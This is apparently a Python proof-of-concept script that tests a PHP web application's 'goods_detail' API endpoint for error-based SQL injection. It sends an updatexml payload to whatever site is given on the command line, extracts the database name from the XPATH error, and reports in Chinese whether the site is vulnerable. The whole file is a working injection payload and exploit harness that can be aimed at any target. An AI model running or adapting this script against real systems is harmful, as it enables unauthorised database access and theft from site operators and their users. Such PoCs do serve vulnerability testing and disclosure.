#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    #print(r.text)
    if "XPATH" in r.text:
        info = re.findall("'~([^']+)'", r.text)
        if len(info) != 0:
            return info[0]
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行payload updatexml(1,concat(0x7e,database(),0x7e) 结果为：", info)
    else:
        print("[-]漏洞不存在")
